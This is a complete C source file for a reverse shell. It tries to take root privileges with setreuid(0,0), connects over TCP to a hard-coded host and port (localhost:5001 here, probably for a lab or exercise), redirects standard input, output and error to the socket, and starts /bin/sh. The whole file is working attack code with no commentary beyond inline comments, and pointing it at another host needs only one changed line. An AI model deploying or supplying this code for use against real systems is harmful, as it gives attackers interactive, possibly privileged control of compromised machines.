#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#define HOST "127.0.0.1"
#define PORT 5001

int main(int argc, char *argv[]) {
    struct sockaddr_in dest;
    int sock;

    // Get maximum privileges.
    setreuid(0,0);
    // Create socket file descriptor.
    sock = socket(AF_INET, SOCK_STREAM, 0);

    // Populate dest with relevant data.
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(HOST);
    dest.sin_port = htons(PORT);

    // Create a TCP connection. If connection fails, exit.
    if(connect(sock, (struct sockaddr *)&dest,sizeof(struct sockaddr)) != 0) {
        perror("Connect error");
	return 1;
	}

    // Connect stdin, stdout and stderr to sock.
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Run shell with all input and output going over sock.
    execve("/bin/sh", NULL, NULL);

    return 0;
}
